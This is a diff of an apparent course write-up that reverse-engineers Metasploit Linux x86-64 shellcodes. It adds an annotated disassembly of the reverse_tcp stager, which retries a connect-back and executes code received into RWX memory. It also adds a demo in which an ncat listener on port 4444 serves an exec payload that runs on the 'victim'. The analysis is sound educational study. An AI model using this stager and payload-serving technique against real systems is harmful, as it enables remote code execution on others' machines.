@@ -1,7 +1,7 @@
 Assignment #5 – Metasploit Shellcode Analysis
 =============================================
 
-In this assignment I will reverse three diferent Linux x86-64 shellcodes produced by Metasploit. I picked three shelcodes at random discounting the stageless Meterpreter ones (which are huge).
+In this assignment I will reverse three different Linux x86-64 shellcodes produced by Metasploit. I picked three shellcodes at random discounting the stageless Meterpreter ones (which are huge).
 
     $ msfvenom -l payloads | grep linux/x64 | grep -v stageless | shuf -n 3
     linux/x64/meterpreter/reverse_tcp    Inject the mettle server payload (staged). Connect back to the attacker
@@ -38,7 +38,7 @@ So we see that the ELF is calling `execve` and executing the command `/bin/sh -c
 
     int execve(const char *pathname, char *const argv[], char *const envp[]);
 
-Now let's see how things are being done behing the scenes. Let's disassemle the ELF:
+Now let's see how things are being done behind the scenes. Let's disassemble the ELF:
 
     $ objdump -M intel -d linux-x64-exec
 
@@ -102,7 +102,7 @@ So `/bin/sh` is pushed to the stack and RDI is used to store a pointer to that s
     00000017  4889E6            mov rsi,rsp               ; rsi = & "-c"
     0000001A  52                push rdx
 
-Now we have a `call` which will push the next instruction's address (`0x20`) to the stack and continue exection at `0x27`. There we push RSI and RDI, the addresses for `-c` and `/bin/sh`. Finally RSI is upated to match RSP, which points to the top of the stack, or in other words the last address we pushed.
+Now we have a `call` which will push the next instruction's address (`0x20`) to the stack and continue execution at `0x27`. There we push RSI and RDI, the addresses for `-c` and `/bin/sh`. Finally RSI is updated to match RSP, which points to the top of the stack, or in other words the last address we pushed.
 
     0000001B  E807000000        call 0x27
     00000020  7768              ja 0x8a
@@ -398,7 +398,7 @@ linux/x64/meterpreter/reverse_tcp
     |     `===< 0x004000f5      78ef           js 0x4000e6
     \           0x004000f7      ffe6           jmp rsi
 
-RAX is set to 9, which corresponds to [`mmap`][man_2_mmap], which purpose is to "map or unmap files or devices into memory". The first argument is `NULL` so the kernel chooses the address at which to create the mapping. The second argument is the length of the mapping, which here is 4 kB. The third arguemnt is the memory protection for the mapping. By looking at `/usr/include/asm-generic/mman-common.h` we know this mapping has `PROT_READ`, `PROT_WRITE` and `PROT_EXEC`, so basically full permissions which corresponds to `0x7`. I'm not sure why `0x1007` is being used instead. Maybe not clearing RDX is an optimisation because the syscall doesn't look into higher bytes of RDX.
+RAX is set to 9, which corresponds to [`mmap`][man_2_mmap], which purpose is to "map or unmap files or devices into memory". The first argument is `NULL` so the kernel chooses the address at which to create the mapping. The second argument is the length of the mapping, which here is 4 kB. The third argument is the memory protection for the mapping. By looking at `/usr/include/asm-generic/mman-common.h` we know this mapping has `PROT_READ`, `PROT_WRITE` and `PROT_EXEC`, so basically full permissions which corresponds to `0x7`. I'm not sure why `0x1007` is being used instead. Maybe not clearing RDX is an optimisation because the syscall doesn't look into higher bytes of RDX.
 
 The fourth argument is `0x22` which looking at `/usr/include/asm-generic/mman-common.h` and `/usr/include/linux/mman.h` we find to be `MAP_ANONYMOUS|MAP_PRIVATE`. Since `MAP_ANONYMOUS` is used `fd` is ignored (according to the manual) so you can notice R8 is not initialised. And finally the last argument, the offset, is set to zero. At this point I have no idea what this mapping will be used for. Note that on failure `mmap` returns -1 and the shellcode checks for that and calls `exit` in that event.
 
@@ -454,10 +454,64 @@ And now we have a `connect` to `127.0.0.1:4444`. The entire `sockaddr_in` struct
     0x004000c1      0f05           syscall
     0x004000c3      59             pop rcx                         ; pop the sockaddr_in structure
 
+Next the return value of `connect` is tested to check if it succeeded. If it didn't, R9 is decremented (it had been set to 10 before) and if it becomes zero the shellcode exits. Otherwise the code proceeds to call [`nanosleep`][man_2_nanosleep] to suspend the execution for 5 seconds. If `nanosleep` fails the shellcode `exit`s. Otherwise it loops back to `connect`. So basically the shellcode tries to connect 10 times, with a 5 second interval. If no connection succeeds it terminates.
+
+        0x004000c4      4885c0         test rax, rax               ; check if `connect` succeeded
+        0x004000c7      7925           jns 0x4000ee
+        0x004000c9      49ffc9         dec r9
+    ,=< 0x004000cc      7418           je 0x4000e6                 ; exit
+    |   0x004000ce      57             push rdi                    ; hold my beer (socket's fd)
+    |   0x004000cf      6a23           push 0x23                   ; __NR_nanosleep = 35 = 0x23
+    |   0x004000d1      58             pop rax
+    |   0x004000d2      6a00           push 0                      ; timespec.tv_nsec = 0
+    |   0x004000d4      6a05           push 5                      ; timespec.tv_sec  = 5
+    |   0x004000d6      4889e7         mov rdi, rsp                ; rdi = &timespec
+    |   0x004000d9      4831f6         xor rsi, rsi                ; rem = NULL
+    |   0x004000dc      0f05           syscall
+    |   0x004000de      59             pop rcx                     ; remove...
+    |   0x004000df      59             pop rcx                     ;   timespec structure
+    |   0x004000e0      5f             pop rdi                     ; give by beer back
+    |   0x004000e1      4885c0         test rax, rax
+    |   0x004000e4      79c7           jns 0x4000ad                ; connect
+    `-> 0x004000e6      6a3c           push 0x3c                   ; exit
+
+    struct timespec {
+        time_t tv_sec;        /* seconds */
+        long   tv_nsec;       /* nanoseconds */
+    };
+
+What if a connection succeeds? Then the shellcode jumps to the final part. First two values are popped. Which values are these? They were previously pushed into the stack and were `mmap`'s return address and the size of the mapped region, 4096. Which syscall is called here? The value of RAX is not set here. But if this part of the code is executing it means `connect` succeeded and its return value was zero. Therefore RAX is implicitly set and the syscall is `read`. RDI is also set to the file descriptor of the socket. So the shellcode reads up to 4096 bytes and writes them to the region mapped by `mmap`. If `read` fails the shellcode exits. Otherwise, execution continues at the mapped region.
+
+         0x00400098      56             push rsi                   ; saving 4096 for later
+         0x00400099      50             push rax                   ; saving `mmap`'s return address for later
+         ...
+     ,=< 0x004000c7      7925           jns 0x4000ee
+     |   ...
+     `-> 0x004000ee      5e             pop rsi                    ; `mmap`'s return address
+         0x004000ef      5a             pop rdx                    ; 4096
+         0x004000f0      0f05           syscall                    ; read
+         0x004000f2      4885c0         test rax, rax
+         0x004000f5      78ef           js 0x4000e6                ; exit
+         0x004000f7      ffe6           jmp rsi
+
+We conclude that this shellcode basically connects back to an attacker and waits for a second shellcode to be injected directly into the process's memory and executes it. To improve reliability the shellcode tries to connect to the attacker up to 10 times with 5 second intervals.
+
+I never knew that this shellcode directly received shellcode to execute. This was cool to analyse and now I know that this shellcode can be used for more than the typical `multi/handler` with a `meterpreter` payload. Let's prove this by injecting another shellcode, namely `linux/x64/exec` which I analysed before.
+
+    @attacker$ ncat -vlp 4444 < linux-x64-exec.raw
+    Ncat: Listening on 0.0.0.0:4444
+
+    $ ./linux-x64-meterpreter-reverse_tcp
+    goncalor
+
+It worked! Our `exec` shellcode, configured to execute `whoami`, was successfully injected and ran on the victim's machine.
+
+That's all for now. I hope you enjoyed my analysis/reversing of these three Metasploit shellcodes.
 
 [man_2_execve]: https://linux.die.net/man/2/execve
 [man_2_socket]: https://linux.die.net/man/2/socket
 [man_2_mmap]: https://linux.die.net/man/2/mmap
+[man_2_nanosleep]: https://linux.die.net/man/2/nanosleep
 [wikipedia_radare2]: https://en.wikipedia.org/wiki/Radare2
 [beej_sockaddr_in]: https://web.archive.org/web/20190202184104/https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
 
